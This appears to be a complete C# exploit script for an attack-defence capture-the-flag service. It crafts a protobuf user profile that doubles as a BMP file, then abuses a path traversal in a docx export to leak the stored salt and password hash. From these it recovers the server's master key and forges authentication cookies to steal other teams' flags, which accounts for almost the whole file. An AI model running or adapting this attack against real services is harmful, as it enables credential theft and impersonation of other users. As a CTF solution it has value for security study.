using System.Drawing;
using System.IO.Compression;
using System.Net;
using System.Net.Http.Json;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Cryptography.KeyDerivation;
using ProtoBuf;

if(!BitConverter.IsLittleEndian)
    throw new Exception("Little-endian architecture expected");

var BaseUri = new Uri(args.Length == 0 ? "http://127.0.0.1:5000/" : args[0]);

var cookies = new CookieContainer();
var client = new HttpClient(new HttpClientHandler {UseCookies = true, CookieContainer = cookies}) {BaseAddress = BaseUri};
var settings = new JsonSerializerOptions
{
    PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
    DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingDefault,
    IncludeFields = true
};

const char Padding1 = 'A';
const char Padding2 = 'B';

const int FieldByteLength = 'M'; /* Proto field of type string with number 8 encoded as 0x42 ('B') - the first byte,
                                  * the second byte is the length of the byte string, this two bytes create 'BM' - BMP file magic prefix */

 int BmpSize = 260; /* We need at least BMP_HEADER + SALT + PASSWORD_HASH + LOGIN + PATRONYMIC length here to get master key secret,
                     * also size must be less than the total proto file size. Also note that we need all bytes in our BMP header
                     * with most significant bit cleared to make all characters in UTF8 use only 1 byte (!) */

var bmp = StructToBytes(new Bmp((uint)(Marshal.SizeOf<Bmp>() + BmpSize), (ushort)(BmpSize / 3) /* 24bpp */, 1));
Console.WriteLine($"BMP header: {BitConverter.ToString(bmp)}");

// Check all chars in BMP header use 1 byte in UTF8
if(Encoding.UTF8.GetByteCount(Encoding.UTF8.GetString(bmp)) != bmp.Length)
    throw new Exception("BMP header must contain only ASCII chars");

var user = new User
{
    Login = RandomNumberGenerator.GetInt32(int.MinValue, int.MaxValue).ToString("x8"),
    Password = Guid.NewGuid().ToString(),

    // Remove magic prefix 'BM' because it will be coded in protobuf by serializing string field with length 'M' (0x4D)
    Patronymic = Encoding.UTF8.GetString(bmp)[2..] + new string(Padding1, FieldByteLength - (bmp.Length - 2)),

    // Some padding to get total proto file greater than bmpSize, all data after bmpSize is ignored by BMP parsers
    Hobby = new string(Padding2, 256)
};

await client.PostAsJsonAsync("/register", user, settings);

var fileId = Guid.NewGuid();

// Exploit path traversal in Open-XML-PowerTools lib to include self proto serialized profile as an image
await client.PutAsync($"/file/{fileId}", new StringContent("<img src='../profile'/>"));

// Export file as docx
await using var stream = await client.GetStreamAsync($"/file/{fileId}?export=true");

// Read docx as zip-archive and extract image
using var archive = new ZipArchive(stream, ZipArchiveMode.Read);
var imageEntry = archive.Entries.FirstOrDefault(entry => entry.FullName.StartsWith("media", StringComparison.OrdinalIgnoreCase));
if(imageEntry == null)
    throw new Exception("No image inserted");

var img = new Bitmap(imageEntry.Open());

// Extract image bitmap data
var data = Enumerable.Range(0, img.Width).Select(i => img.GetPixel(i, 0)).SelectMany(color => new[] {color.B, color.G, color.R}).ToArray();
Console.WriteLine("Bitmap data: " + BitConverter.ToString(data));

// Trim paddings, extract proto serialized password part
var memory = new Memory<byte>(data).TrimStart((byte)Padding1).TrimEnd((byte)Padding2);
memory = memory.Slice(0, memory.Length - 3 /* length of the proto serialized Hobby field header */);
Console.WriteLine(BitConverter.ToString(memory.ToArray()));

var result = Serializer.Deserialize<User>(memory);
Console.WriteLine($"Salt: {BitConverter.ToString(result.Salt)}");
Console.WriteLine($"Hash: {BitConverter.ToString(result.PasswordHash)}");

const int KeySize = 24;

// Master key is used as a pepper and XORed with password hash before persisting user profile, so XOR known hash with leaked hash to recover THE MASTER KEY 
var hash = HashPassword(user.Password, result.Salt, new byte[KeySize]);
var masterKey = hash.Select((b, i) => (byte)(b ^ result.PasswordHash[i])).Take(KeySize).ToArray();
Console.WriteLine($"THE MASTER KEY: {Convert.ToBase64String(masterKey)}");

var flagRegex = new Regex(@"TEAM\d+_[A-Z0-9]{32}", RegexOptions.Compiled | RegexOptions.IgnoreCase);

string? line;
while((line = Console.ReadLine()) != null) // Obtaining flags
{
    var parts = line.Trim().Split('@');
    fileId = new Guid(parts[0]);
    var login = parts[1];

    var auth = Uri.EscapeDataString($"{login} {Convert.ToBase64String(Hmac(login, masterKey))}");
    Console.WriteLine($"Auth cookie: {auth}");

    cookies.SetCookies(BaseUri, "auth=" + auth);
    Console.WriteLine(flagRegex.Matches(await client.GetStringAsync($"/file/{fileId}"))
        .Select(match => match.Value)
        .FirstOrDefault());
}

#region ServiceAuthMethods

byte[] HashPassword(string password, byte[] salt, byte[] pepper)
    => KeyDerivation.Pbkdf2(password, salt, KeyDerivationPrf.HMACSHA256, iterationCount: 7, 256 / 8).Select((b, i) => (byte)(b ^ pepper[i % pepper.Length])).ToArray();

Guid ToUserId(string login)
    => new(SHA256.HashData(Encoding.UTF8.GetBytes(login))[..16]);

byte[] Hmac(string login, byte[] key)
    => HMACSHA256.HashData(key, ToUserId(login).ToByteArray());

#endregion

byte[] StructToBytes<T>(T value) where T : unmanaged
{
    var ptr = IntPtr.Zero;
    var structSize = Marshal.SizeOf(typeof(T));
    try
    {
        ptr = Marshal.AllocHGlobal(structSize);
        Marshal.StructureToPtr(value, ptr, false);
        var bytes = new byte[structSize];
        Marshal.Copy(ptr, bytes, 0, structSize);
        return bytes;
    }
    finally
    {
        if(ptr != IntPtr.Zero)
            Marshal.FreeHGlobal(ptr);
    }
}

// https://en.wikipedia.org/wiki/BMP_file_format
[StructLayout(LayoutKind.Sequential, Pack = 1)]
struct Bmp
{
    public Bmp(uint size, ushort width, ushort height)
    {
        ByteLength = size;
        Width = width;
        Height = height;
    }

    // BMP file header
    ushort Magic = 0x4D42;      // BM in ASCII (little-endian)
    uint ByteLength;            // The size of the BMP file in bytes
    ushort Reserved1 = 0;       // Reserved; actual value depends on the application that creates the image
    ushort Reserved2 = 0;       // Reserved; actual value depends on the application that creates the image
    uint DataOffset = 0x1A;     // The offset of the byte where the bitmap image data (pixel array) can be found

    // DIB header
    uint HeaderSize = 0x0C;
    ushort Width;
    ushort Height;
    ushort ColorPlanes = 0x01;  // The number of color planes (must be 1)
    ushort BitDepth = 0x18;     // Use 24bpp here because server converting may drop alpha channel
}

[ProtoContract] // Copy-paste from the service
public class User
{
    [ProtoMember(1)] public DateTime? BirthDate;
    [ProtoMember(2)] public string? Gender;
    [ProtoMember(3)] public string? Country;
    [ProtoMember(4)] public string? Company;
    [ProtoMember(5)] public string? Address;
    [ProtoMember(6)] public string? Name;
    [ProtoMember(7)] public string? Surname;
    [ProtoMember(8)] public string? Patronymic;
    [ProtoMember(9)] public string? Login;
    [ProtoIgnore] public string? Password;
    [JsonIgnore] [ProtoMember(10)] public byte[]? Salt;
    [JsonIgnore] [ProtoMember(11)] public byte[]? PasswordHash;
    [ProtoMember(12)] public string? Hobby;
    [ProtoMember(13)] public DateTime Created;
}
